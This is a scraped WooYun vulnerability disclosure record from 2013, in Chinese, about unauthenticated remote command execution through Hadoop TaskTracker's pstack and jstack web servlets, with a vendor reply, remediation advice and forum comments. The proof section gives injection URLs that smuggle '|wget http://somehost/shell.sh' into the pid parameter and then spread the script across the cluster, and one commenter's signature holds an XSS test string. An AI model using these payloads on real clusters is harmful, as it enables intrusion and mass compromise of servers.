{"id": 13086, "wybug_id": "wooyun-2013-020282", "wybug_title": "Apache Hadoop远程命令执行", "wybug_corp": "Apache", "wybug_author": "Bincker", "wybug_date": "2013-03-18 23:51", "wybug_open_date": "2013-05-02 23:52", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行", "漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-02：\t细节向公众公开  简要描述： 通过hadoop,hbase，hdfs0.2 RC版本的管理web端能远程执行命令，通过该节点对集群服务器进行任务分发（该是基本功能，当然可以进行批量提权linux主机）渗透进hadoop集群 详细说明：  通过hadoop,hbase，hdfs低版本的管理web端能远程执行命令，通过该节点对集群服务器进行任务分发（该是基本功能，当然可以进行批量提权linux主机）渗透进hadoop集群。   漏洞证明：  通过hadoop,hbase，hdfs0.2 RC版本的管理web端能远程执行命令，通过该节点对集群服务器进行任务分发（该是基本功能，当然可以进行批量提权linux主机）渗透进hadoop集群。原因是 jstack pstack servlet 执行命令\n\n远程执行命令，http://hadoop_host:50060/pstack?pid=123|wget http://somehost/shell.shhttp://hadoop_host:50060/jstack?pid=123|wget http://somehost/shell.sh进行任务分发，批量对集群进行命令执行 http://hadoop_host/pstack?pid=123|home/work/hadoop/streaming.jar /home/shell.shhttp://hadoop_host/jstack?pid=123|home/work/hadoop/streaming.jar /home/shell.sh   修复方案：  进行升级至最新稳定版本，对应服务器的默认50070,50075,50090端口的访问控制。   版权声明：转载请注明来源 Bincker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2013-03-22 17:02 厂商回复： 先行确认，暂未在生产系统实例中复现。已作为重要事件列入处置队列。按相邻网络攻击进行评估，rank=5.96*1.3*1.8（云安全）=13.946 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-19 00:19 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  看起来好牛X    \n     2013-03-19 00:23 |    \t\tkindle \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:12        | hh)\t\t \n  这个可以有    \n     2013-03-19 01:46 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  确实牛B    \n     2013-03-19 03:00 |    \t\tEl4pse \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 世界上从来没有不可能这几个字，可不可能完...)\t\t \n  马克    \n     2013-03-19 07:12 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:76        | coder)\t\t \n    前提是要能进管理web端? 个人觉得产品的基本功能设计是没问题的，因为管理端是在所有节点顶端，拥有其他节点的控制或操作权限是正常的，不然一些基本功能的实现不好搞，不过这对渗透其他节点的主机提供了方便。另外，我是来看洞主提权有什么新技巧的？    \n     2013-03-19 08:49 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:209        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  强烈关注    \n     2013-03-19 08:54 |    \t\tuni3orns \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:2        | 过来膜拜各位洞主的)\t\t \n  留名关注    \n     2013-03-19 09:24 |    \t\tBincker \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:23        )\t\t \n  @shine 管理端是个展示集群运行状态页面，类似apache默认index ，和log记录等，情况。几个端口没进行授权验证，log文件可以遍历，ps 可观察节点进程状态不过信息泄漏外没什么太大利用价值。厂商hadoop版本过低可需紧急进行升级操作。    \n     2013-03-19 09:36 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  关注原创漏洞~    \n     2013-03-19 09:40 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:76        | coder)\t\t \n  @Bincker 恩！见过，是这个？http://zone.wooyun.org/content/2970那洞主的意思让我再强烈关注一下！    \n     2013-03-19 10:24 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  坐等公开、图片保存。。    \n     2013-03-19 11:08 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:76        | coder)\t\t \n  @Enjoy_Hacking 。。。公开不就能看到图片了？都这么激动！    \n     2013-03-19 11:49 |    \t\t马燕羊蝎子 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:10        | 亲，啥时候请吃马燕羊蝎子。)\t\t \n  哈哈，的确批量找了一些目标。坐等提权新技巧。。    \n     2013-03-19 13:35 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:76        | coder)\t\t \n  @马燕羊蝎子  关键你要找到hadoop对应项目及版本，可能是要进hbase的一类管理组件（这个嘛...），我猜Apache恐怕不会承认这是个漏洞，算是个安全问题吧！    \n     2013-03-19 13:44 |    \t\t马燕羊蝎子 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:10        | 亲，啥时候请吃马燕羊蝎子。)\t\t \n  @shine 嗯。    \n     2013-03-22 17:54 |    \t\t0x7c \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 我的0day用完了)\t\t \n  虽然我不知道你们在说什么，但是好像很厉害的样子耶。    \n     2013-03-22 18:08 |    \t\tsql  \t\t\t( 核心白帽子 |\t\t\t        Rank:1127 漏洞数:109        | 带着两个MM（mysql,mssql），玩3p（asp,php...)\t\t \n  虽然我不知道你们在说什么，但看起来好像很牛逼的样子耶。     \n     2013-03-22 22:16 |    \t\t小色 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 撸的一手好管)\t\t \n  坐等公开    \n     2013-03-23 11:47 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  关注    \n     2013-03-23 22:01 |    \t\tDefa \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:13        | <img src=1 onerror=alert(1)>)\t\t \n  关注    \n     2013-05-03 09:04 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  看了半天 还是不懂 这么高深    \n     2013-05-03 10:00 |    \t\t慕林 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:1        | 好钻研， 爱安全)\t\t \n  关注，     \n     2013-05-08 13:59 |    \t\t慕林 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:1        | 好钻研， 爱安全)\t\t \n  50060是web UI of the TaskTracker daemon的端口吧？ 我用hadoop-0.20.0版本的， 部署后，访问“http://hadoop_host:50060/jstack”报404错误。 是我版本用的不对？    \n     2014-04-24 10:11 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  mark    \n     2014-07-14 15:39 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:68        | 潜心学习~~~)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}